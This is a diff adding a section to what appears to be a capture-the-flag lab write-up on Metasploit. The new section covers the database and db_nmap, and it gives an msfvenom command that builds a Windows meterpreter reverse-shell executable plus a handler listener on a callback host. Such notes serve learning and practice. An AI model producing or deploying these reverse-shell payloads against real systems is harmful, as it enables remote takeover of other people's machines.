@@ -245,6 +245,27 @@ meterpreter > cat c:\\Users\\Jon\\Documents\\flag.txt
 flag{THM-5455554845}
 ```
 
+## ⚙️ Additional Usage
+
+- Metasploit can use a **PostgreSQL database** to store information, which is especially useful when working with multiple targets.
+
+Using the `db_nmap` command , we can run Nmap scans and automatically save the results into the database and access them using `hosts` or `services`. Saved hosts can also be reused directly in modules with the `hosts -R` command, which automatically sets the RHOSTS value.
+
+- Metasploit also has a tool **Msfvenom**, used to generate payloads in different formats (e.g. .exe, .elf, .php) for various target systems. Unlike payloads used inside msfconsole (which are delivered automatically by an exploit), msfvenom is used to create **standalone payloads** that must be manually delivered to the target.(e.g. through file upload or social engineering). Example:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.200 LPORT=4444 -f exe > shell.exe
+```
+
+Most payloads are reverse payloads, meaning the target connects back to us. To receive this connection, we need a listener: 
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.213.200
+set LPORT 4444
+run
+```
+Once the payload is executed on the target, the handler will catch the session.
+
 ## 🧠 Takeaways
 
 - **SMB (Server Message Block)** is a protocol used by Windows systems for file sharing, printer access, and communication between machines. It typically runs on **port 445**.
